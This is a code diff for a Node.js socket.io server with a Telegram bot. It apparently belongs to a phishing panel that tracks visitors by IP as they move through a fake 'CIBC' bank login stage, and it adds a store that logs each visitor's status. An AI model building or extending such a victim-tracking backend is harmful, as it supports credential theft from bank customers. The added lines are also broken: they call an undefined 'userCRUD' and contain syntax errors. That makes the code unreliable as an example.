@@ -14,6 +14,7 @@ const TelegramBot = require('node-telegram-bot-api');
 const session = require('express-session');
 const crypto = require('crypto');
 const sessionStore = new Map();
+const usersDAO = require('./usersDAO');
 
 (async () => {
     fetch = (await import('node-fetch')).default;
@@ -228,12 +229,13 @@ io.on('connection', (socket, req) => {
     
     socket.join(userIP)
 
-    let userData = {
-            ip: userIP,
-            status: 'active',
-            page: 'CIBC',
-            stage: 'Login'
-        }
+    usersDAO.createUserorUpdate(userIP, {
+        status: 'active',
+        page: 'CIBC',
+        stage: 'Login'
+    });
+
+    socket.emit('join', userCRUD.getUserByIP(userIP);)
     
 
     
@@ -273,6 +275,14 @@ io.on('connection', (socket, req) => {
 
         io.to(ip).emit('choice', data)
     });
+
+    socket.on('disconnect', () => {
+        // Update a user by IP
+        userCRUD.updateUser(userIP, {
+          status: 'inactive'
+        });
+        socket.emit('leave', userCRUD.getUserByIP(userIP);)
+    })
 
 
 });
